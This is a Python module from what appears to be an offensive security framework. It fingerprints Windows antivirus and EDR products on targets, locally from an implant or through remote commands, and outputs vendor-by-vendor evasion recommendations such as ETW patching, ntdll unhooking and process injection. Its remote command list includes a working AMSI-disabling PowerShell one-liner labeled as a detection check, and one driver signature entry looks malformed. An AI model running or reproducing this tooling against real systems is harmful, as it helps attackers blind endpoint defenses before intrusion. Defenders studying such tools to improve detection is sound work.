"""EDR/AV Detection and Evasion Profiling Engine.

Detects endpoint security products (AV, EDR, XDR) on Windows targets through:
- WMI queries (AntiVirusProduct, AntiSpywareProduct)
- Service enumeration (running security services)
- Process enumeration (security agent processes)
- Registry inspection (installed security products)
- Driver enumeration (kernel security drivers)
- File system checks (known installation paths)
- DLL injection detection (hooked modules)

Supports remote detection via WinRM/SMB/WMI and local detection from an implant.
Generates an evasion profile recommending bypass techniques based on detected defenses.
"""

from __future__ import annotations

import subprocess
import sys
from dataclasses import dataclass, field
from typing import Any

WINDOWS = sys.platform == "win32"

EDR_SIGNATURES: dict[str, dict[str, Any]] = {
    "CrowdStrike Falcon": {
        "processes": ["CSFalconService.exe", "CSFalconContainer.exe"],
        "services": ["CSFalconService", "CSAgent"],
        "drivers": ["CSAgent.sys", "C:\\.sys"],
        "registry": [r"HKLM\SYSTEM\CurrentControlSet\Services\CSAgent"],
        "paths": [r"C:\Program Files\CrowdStrike"],
        "wmi_vendor": "CrowdStrike",
    },
    "Microsoft Defender": {
        "processes": ["MsMpEng.exe", "NisSrv.exe", "SenseCncProxy.exe", "SenseIR.exe"],
        "services": ["WinDefend", "WdNisSvc", "Sense"],
        "drivers": ["WdFilter.sys", "WdNisDrv.sys", "WdBoot.sys"],
        "registry": [r"HKLM\SOFTWARE\Microsoft\Windows Defender"],
        "paths": [r"C:\ProgramData\Microsoft\Windows Defender"],
        "wmi_vendor": "Microsoft Corporation",
    },
    "Microsoft Defender for Endpoint": {
        "processes": ["SenseCncProxy.exe", "SenseIR.exe", "MsSense.exe"],
        "services": ["Sense", "WdNisSvc"],
        "drivers": ["WdFilter.sys"],
        "registry": [r"HKLM\SOFTWARE\Microsoft\Windows Advanced Threat Protection"],
        "paths": [r"C:\Program Files\Windows Defender Advanced Threat Protection"],
        "wmi_vendor": "Microsoft",
    },
    "SentinelOne": {
        "processes": ["SentinelAgent.exe", "SentinelAgentWorker.exe", "SentinelHelperService.exe"],
        "services": ["SentinelAgent"],
        "drivers": ["SentinelMonitor.sys"],
        "registry": [r"HKLM\SYSTEM\CurrentControlSet\Services\SentinelAgent"],
        "paths": [r"C:\Program Files\SentinelOne"],
        "wmi_vendor": "SentinelOne",
    },
    "Carbon Black": {
        "processes": ["CbDefense.exe", "cb.exe", "CarbonBlack.exe", "RepMgr.exe"],
        "services": ["CbDefense", "CarbonBlack"],
        "drivers": ["cbk7.sys", "carbonblackk.sys"],
        "registry": [r"HKLM\SYSTEM\CurrentControlSet\Services\CbDefense"],
        "paths": [r"C:\Program Files\Confer", r"C:\Program Files\CarbonBlack"],
        "wmi_vendor": "Carbon Black",
    },
    "Cylance": {
        "processes": ["CylanceSvc.exe", "CylanceUI.exe"],
        "services": ["CylanceSvc"],
        "drivers": ["CyProtectDrv.sys", "CyKrnl.sys"],
        "registry": [r"HKLM\SYSTEM\CurrentControlSet\Services\CylanceSvc"],
        "paths": [r"C:\Program Files\Cylance"],
        "wmi_vendor": "Cylance",
    },
    "McAfee ENS": {
        "processes": ["Mcshield.exe", "FemEngine.exe", "McAfee.TrueKey.Service.exe", "mfemms.exe"],
        "services": ["McAfeeFramework", "McShield", "mfemms"],
        "drivers": ["mfehidk.sys", "mfewfpk.sys", "mfeavfk.sys"],
        "registry": [r"HKLM\SOFTWARE\McAfee"],
        "paths": [r"C:\Program Files\McAfee"],
        "wmi_vendor": "McAfee",
    },
    "Symantec Endpoint": {
        "processes": ["Rtvscan.exe", "Smc.exe", "ccSvcHst.exe", "SymCorpUI.exe"],
        "services": ["Symantec Endpoint Protection", "SepMasterService", "SmcService"],
        "drivers": ["symevent.sys", "symefasi.sys", "symevnt.sys"],
        "registry": [r"HKLM\SOFTWARE\Symantec"],
        "paths": [r"C:\Program Files (x86)\Symantec"],
        "wmi_vendor": "Symantec",
    },
    "Trend Micro": {
        "processes": ["coreServiceShell.exe", "coreFrameworkHost.exe", "Ntrtscan.exe", "TmListen.exe"],
        "services": ["Trend Micro", "TmPreFilter", "ntrtscan"],
        "drivers": ["tmcomm.sys", "tmeevw.sys", "tmactmon.sys"],
        "registry": [r"HKLM\SOFTWARE\TrendMicro"],
        "paths": [r"C:\Program Files\Trend Micro"],
        "wmi_vendor": "Trend Micro",
    },
    "Sophos": {
        "processes": ["SavService.exe", "SophosFS.exe", "SophosML.exe", "hmpalert.exe"],
        "services": ["Sophos", "SAVService", "Sophos MCS Agent"],
        "drivers": ["savonaccess.sys", "sophosed.sys"],
        "registry": [r"HKLM\SOFTWARE\Sophos"],
        "paths": [r"C:\Program Files\Sophos"],
        "wmi_vendor": "Sophos",
    },
    "Elastic EDR": {
        "processes": ["elastic-endpoint.exe", "elastic-agent.exe"],
        "services": ["Elastic Endpoint", "Elastic Agent"],
        "drivers": ["ElasticEndpoint.sys"],
        "registry": [r"HKLM\SOFTWARE\Elastic"],
        "paths": [r"C:\Program Files\Elastic"],
        "wmi_vendor": "Elastic",
    },
    "Palo Alto Cortex XDR": {
        "processes": ["cyserver.exe", "CyveraConsole.exe", "Traps.exe"],
        "services": ["CyveraService", "Traps"],
        "drivers": ["cyvrfsfd.sys", "cyvrmtgn.sys"],
        "registry": [r"HKLM\SYSTEM\CurrentControlSet\Services\CyveraService"],
        "paths": [r"C:\Program Files\Cyvera"],
        "wmi_vendor": "Palo Alto",
    },
    "Bitdefender": {
        "processes": ["bdservicehost.exe", "bdagent.exe", "vsserv.exe"],
        "services": ["VSSERV", "Bitdefender"],
        "drivers": ["bdfndisf6.sys", "bdfwfpf.sys", "bdsandbox.sys"],
        "registry": [r"HKLM\SOFTWARE\Bitdefender"],
        "paths": [r"C:\Program Files\Bitdefender"],
        "wmi_vendor": "Bitdefender",
    },
    "Kaspersky": {
        "processes": ["avp.exe", "avpui.exe", "klnagent.exe"],
        "services": ["AVP", "klnagent"],
        "drivers": ["klif.sys", "kl1.sys", "klim6.sys"],
        "registry": [r"HKLM\SOFTWARE\KasperskyLab"],
        "paths": [r"C:\Program Files (x86)\Kaspersky Lab"],
        "wmi_vendor": "Kaspersky",
    },
    "ESET": {
        "processes": ["ekrn.exe", "egui.exe", "eamonm.exe"],
        "services": ["ekrn", "ESET"],
        "drivers": ["eamonm.sys", "ehdrv.sys", "epfw.sys"],
        "registry": [r"HKLM\SOFTWARE\ESET"],
        "paths": [r"C:\Program Files\ESET"],
        "wmi_vendor": "ESET",
    },
    "Malwarebytes": {
        "processes": ["MBAMService.exe", "mbamtray.exe"],
        "services": ["MBAMService", "MBAMChameleon"],
        "drivers": ["mbam.sys", "mbamchameleon.sys", "farflt.sys"],
        "registry": [r"HKLM\SOFTWARE\Malwarebytes"],
        "paths": [r"C:\Program Files\Malwarebytes"],
        "wmi_vendor": "Malwarebytes",
    },
    "FireEye": {
        "processes": ["xagt.exe", "xagtnotif.exe"],
        "services": ["FireEye", "xagt"],
        "drivers": ["feKern.sys"],
        "registry": [r"HKLM\SOFTWARE\FireEye"],
        "paths": [r"C:\Program Files\FireEye"],
        "wmi_vendor": "FireEye",
    },
    "Fortinet FortiEDR": {
        "processes": ["fortiedr.exe", "FortiEDRCollector.exe"],
        "services": ["FortiEDR", "FortiEDRCollector"],
        "drivers": ["fortiedr.sys"],
        "registry": [r"HKLM\SYSTEM\CurrentControlSet\Services\FortiEDR"],
        "paths": [r"C:\Program Files\Fortinet"],
        "wmi_vendor": "Fortinet",
    },
}


@dataclass
class EDRFinding:
    product: str
    confidence: str
    source: str
    details: str


@dataclass
class EDRProfile:
    detected: list[EDRFinding] = field(default_factory=list)
    processes: list[str] = field(default_factory=list)
    services: list[str] = field(default_factory=list)
    drivers: list[str] = field(default_factory=list)
    bypass_recommendations: list[str] = field(default_factory=list)
    detection_severity: str = "unknown"


class EDRDetector:
    """Detect antivirus and EDR products on Windows targets.

    Combines multiple detection sources to fingerprint security products:
    WMI, services, processes, registry, drivers, file paths.

    Can operate in local mode (running on the target) or generate
    commands for remote execution via SMB/WinRM/WMI.
    """

    @staticmethod
    def detect_local() -> EDRProfile:
        """Detect EDR products on the local Windows machine.

        Returns:
            EDRProfile with detected products and recommendations.
        """
        profile = EDRProfile()

        if WINDOWS:
            profile.processes = EDRDetector._local_processes()
            profile.services = EDRDetector._local_services()
            profile.drivers = EDRDetector._local_drivers()

        profile.detected = EDRDetector._match_signatures(profile)
        profile.bypass_recommendations = EDRDetector._generate_recommendations(profile)
        profile.detection_severity = EDRDetector._severity(profile)
        return profile

    @staticmethod
    def detect_remote_commands(remote_type: str = "wmi") -> list[dict[str, str]]:
        """Generate commands for remote EDR detection.

        Args:
            remote_type: Transport method (wmi, smb, winrm, ssh).

        Returns:
            List of dicts with 'name' and 'command' keys.
        """
        commands = []

        if remote_type in ("wmi", "smb"):
            commands.append({
                "name": "WMI AntivirusProduct",
                "command": "wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState,pathToSignedProductExe /format:list",
            })
            commands.append({
                "name": "WMI AntispywareProduct",
                "command": "wmic /namespace:\\\\root\\SecurityCenter2 path AntiSpywareProduct get displayName,pathToSignedProductExe /format:list",
            })

        commands.append({
            "name": "Running Services (Security)",
            "command": 'sc query state= all | findstr /i "defender crowdstrike sentinelone carbon cylance mcafee symantec trend sophos elastic cortex bitdefender kaspersky eset malwarebytes fireeye fortiedr"',
        })
        commands.append({
            "name": "Running Processes (Security)",
            "command": 'tasklist /v | findstr /i "defender crowdstrike sentinelone carbon cylance mcafee symantec trend sophos elastic cortex bitdefender kaspersky eset malwarebytes fireeye fortiedr falcon"',
        })
        commands.append({
            "name": "Loaded Drivers (Security)",
            "command": 'driverquery /v | findstr /i "defender crowdstrike sentinelone carbon cylance mcafee symantec trend sophos elastic cortex bitdefender kaspersky eset malwarebytes fireeye fortiedr"',
        })
        commands.append({
            "name": "Registry — Installed Products",
            "command": r'reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s 2>nul | findstr /i "defender crowdstrike sentinelone carbon cylance mcafee symantec trend sophos elastic cortex bitdefender kaspersky eset malwarebytes fireeye fortiedr"',
        })
        commands.append({
            "name": "Registry — 32-bit Installed",
            "command": r'reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" /s 2>nul | findstr /i "defender crowdstrike sentinelone carbon cylance mcafee symantec trend sophos elastic cortex"',
        })
        commands.append({
            "name": "Defender Status",
            "command": "powershell -c \"Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled,AntispywareEnabled,BehaviorMonitorEnabled | Format-List\"",
        })
        commands.append({
            "name": "AMSI Provider (PowerShell)",
            "command": "powershell -c \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\"",
        })

        return commands

    @staticmethod
    def _local_processes() -> list[str]:
        try:
            result = subprocess.run(
                ["tasklist", "/fo", "csv", "/nh"],
                capture_output=True, text=True, timeout=10, shell=True,
            )
            return [line.split(",")[0].strip('"').lower() for line in result.stdout.splitlines() if line.strip()]
        except Exception:
            return []

    @staticmethod
    def _local_services() -> list[str]:
        try:
            result = subprocess.run(
                ["sc", "query", "state=", "all"],
                capture_output=True, text=True, timeout=10, shell=True,
            )
            services = []
            for line in result.stdout.splitlines():
                if "SERVICE_NAME" in line:
                    services.append(line.split(":")[1].strip().lower())
            return services
        except Exception:
            return []

    @staticmethod
    def _local_drivers() -> list[str]:
        try:
            result = subprocess.run(
                ["driverquery", "/fo", "csv", "/nh"],
                capture_output=True, text=True, timeout=10, shell=True,
            )
            return [line.split(",")[0].strip('"').lower() for line in result.stdout.splitlines() if line.strip()]
        except Exception:
            return []

    @staticmethod
    def _match_signatures(profile: EDRProfile) -> list[EDRFinding]:
        findings: list[EDRFinding] = []
        procs_lower = [p.lower() for p in profile.processes]
        svcs_lower = [s.lower() for s in profile.services]
        drivers_lower = [d.lower() for d in profile.drivers]

        for product, sigs in EDR_SIGNATURES.items():
            matches = []

            for proc in sigs.get("processes", []):
                if any(proc.lower() in p for p in procs_lower):
                    matches.append(f"process:{proc}")

            for svc in sigs.get("services", []):
                if any(svc.lower() in s for s in svcs_lower):
                    matches.append(f"service:{svc}")

            for drv in sigs.get("drivers", []):
                if any(drv.lower() in d for d in drivers_lower):
                    matches.append(f"driver:{drv}")

            if matches:
                confidence = "high" if len(matches) >= 2 else "medium"
                findings.append(EDRFinding(
                    product=product,
                    confidence=confidence,
                    source="+".join(matches),
                    details=f"Found: {', '.join(matches)}",
                ))

        return findings

    @staticmethod
    def _generate_recommendations(profile: EDRProfile) -> list[str]:
        recommendations: list[str] = []

        product_names = [f.product.lower() for f in profile.detected]

        recommendations.append("syscall — Direct syscalls to bypass userland hooks")

        if any("crowdstrike" in p for p in product_names):
            recommendations.append("unhook — ntdll.dll remediation for CrowdStrike userland hooks")
            recommendations.append("process_ghosting — Fileless execution to evade Falcon sensor")
            recommendations.append("ppid_spoof — Spoof parent process as legitimate binary")

        if any("defender" in p for p in product_names):
            recommendations.append("amsi_bypass — PowerShell AMSI patching or forced amsiInitFailed")
            recommendations.append("etw_bypass — Patch EtwEventWrite in ntdll to blind Defender telemetry")
            recommendations.append("dll_sideload — Use signed MS binaries for DLL proxying")

        if any("sentinelone" in p for p in product_names):
            recommendations.append("process_inject — Inject into trusted process (SentinelOne monitors comms)")
            recommendations.append("reflective_dll — Avoid disk-write detection by SentinelOne static scanner")

        if any("carbon" in p for p in product_names):
            recommendations.append("early_bird — APC injection before process initialization (CB watches CreateProcess)")
            recommendations.append("thread_hijack — Hijack existing thread to avoid CbDefense process hooks")

        if any("cylance" in p for p in product_names):
            recommendations.append("mutation — Polymorphic shellcode (Cylance relies on static ML signatures)")
            recommendations.append("encryption — AES encrypt payload until execution")

        if any("mcafee" in p for p in product_names):
            recommendations.append("encryption — XOR/AES to bypass ENS on-access scanner")
            recommendations.append("sleep_obfuscation — Ekko/FOLIAGE style NtDelayExecution spoofing")

        if any("symantec" in p for p in product_names):
            recommendations.append("process_herpaderping — Modify executable after mapping")
            recommendations.append("reflectiveload — Load DLL from memory, no disk write")

        if any("elastic" in p for p in product_names):
            recommendations.append("direct_syscall — Elastic EDR hooks heavily at userland")
            recommendations.append("indirect_syscall — Use syswhispers3 style for Elastic evasion")

        if any("cortex" in p for p in product_names):
            recommendations.append("module_stomping — Overwrite loaded DLL .text section")
            recommendations.append("call_stack_spoofing — Spoof return addresses to bypass Cortex thread stack analysis")

        if len(profile.detected) >= 2:
            recommendations.append("multi_layer — Combine 2+ techniques (e.g., syscall + encryption + unhook)")

        if len(profile.detected) == 0:
            recommendations.append("standard — Basic obfuscation sufficient (base64 + string splitting)")

        return recommendations

    @staticmethod
    def _severity(profile: EDRProfile) -> str:
        high_count = sum(1 for f in profile.detected if f.confidence == "high")
        total = len(profile.detected)
        if high_count >= 2:
            return "SEVERE — Multiple EDR products confirmed"
        if total >= 2:
            return "HIGH — Multiple security products detected"
        if total == 1:
            return "MODERATE — Single security product detected"
        return "LOW — No known EDR signatures found"

    @staticmethod
    def generate_edr_check_script(remote_type: str = "wmi") -> str:
        """Generate a PowerShell script for comprehensive EDR detection.

        Args:
            remote_type: Execution method hint for the script comments.

        Returns:
            Complete PowerShell script as a string.
        """
        ps_script = """# LazyOwn EDR Detection Script - Comprehensive security product fingerprinting
# Generated for {{remote_type}} execution

Write-Host "=== LazyOwn EDR Detection ===" -ForegroundColor Cyan

# AMSI Bypass (optional — uncomment if needed)
# [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

Write-Host "[*] Checking WMI AntiVirusProduct..." -ForegroundColor Yellow
try {
    Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | ForEach-Object {
        Write-Host "  AV: $($_.displayName) (State: $($_.productState))"
    }
} catch { Write-Host "  WMI query failed: $_" }

Write-Host "[*] Checking WMI AntiSpywareProduct..."
try {
    Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiSpywareProduct | ForEach-Object {
        Write-Host "  AS: $($_.displayName)"
    }
} catch { Write-Host "  No antispyware products." }

Write-Host "[*] Checking running processes..."
$edr_procs = @("MsMpEng","NisSrv","SenseCncProxy","SenseIR","CSFalconService",
"SentinelAgent","SentinelHelperService","CbDefense","cb","CarbonBlack",
"CylanceSvc","Mcshield","FemEngine","Rtvscan","Smc","coreServiceShell",
"Ntrtscan","SavService","SophosFS","SophosML","elastic-endpoint",
"cyserver","CyveraConsole","bdservicehost","avp","avpui","ekrn",
"MBAMService","xagt","fortiedr")
Get-Process | Where-Object { $edr_procs -contains $_.ProcessName } | ForEach-Object {
    Write-Host "  SECURITY PROCESS: $($_.ProcessName) (PID: $($_.Id))"
}

Write-Host "[*] Checking services..."
$edr_svcs = @("WinDefend","WdNisSvc","Sense","CSFalconService","SentinelAgent",
"CbDefense","CarbonBlack","CylanceSvc","McShield","mfemms","SepMasterService",
"Trend Micro","SAVService","Elastic Endpoint","CyveraService","VSSERV","AVP",
"ekrn","MBAMService","FireEye","FortiEDR")
Get-Service | Where-Object { $edr_svcs -contains $_.Name } | ForEach-Object {
    Write-Host "  SECURITY SERVICE: $($_.Name) (Status: $($_.Status))"
}

Write-Host "[*] Checking loaded drivers..."
$edr_drivers = @("WdFilter","WdNisDrv","WdBoot","CSAgent","SentinelMonitor",
"cbk7","CyProtectDrv","CyKrnl","mfehidk","mfewfpk","symevent","tmcomm",
"savonaccess","ElasticEndpoint","cyvrfsfd","bdfndisf6","klif","eamonm",
"mbam","feKern","fortiedr")
driverquery /v 2>$null | ForEach-Object {
    foreach ($drv in $edr_drivers) {
        if ($_ -match $drv) {
            Write-Host "  SECURITY DRIVER: $_"
        }
    }
}

Write-Host "[*] Checking Defender status..."
try {
    $mpStatus = Get-MpComputerStatus -ErrorAction Stop
    Write-Host "  AV Enabled: $($mpStatus.AntivirusEnabled)"
    Write-Host "  Real-Time:  $($mpStatus.RealTimeProtectionEnabled)"
    Write-Host "  Behavior:   $($mpStatus.BehaviorMonitorEnabled)"
    Write-Host "  IOAV:       $($mpStatus.IoavProtectionEnabled)"
} catch { Write-Host "  Defender PowerShell module not available." }

Write-Host "[*] Checking registry for security products..."
$reg_paths = @(
    "HKLM:\\SOFTWARE\\Microsoft\\Windows Defender",
    "HKLM:\\SOFTWARE\\CrowdStrike",
    "HKLM:\\SOFTWARE\\Symantec",
    "HKLM:\\SOFTWARE\\McAfee",
    "HKLM:\\SOFTWARE\\TrendMicro",
    "HKLM:\\SOFTWARE\\Sophos",
    "HKLM:\\SOFTWARE\\Elastic",
    "HKLM:\\SOFTWARE\\Bitdefender",
    "HKLM:\\SOFTWARE\\KasperskyLab",
    "HKLM:\\SOFTWARE\\ESET",
    "HKLM:\\SOFTWARE\\Malwarebytes"
)
foreach ($path in $reg_paths) {
    if (Test-Path $path) {
        Write-Host "  FOUND: $path"
    }
}

Write-Host "=== Detection Complete ===" -ForegroundColor Green
"""
        return ps_script.replace("{{remote_type}}", remote_type)


__all__ = ["EDRDetector", "EDRProfile", "EDRFinding", "EDR_SIGNATURES"]
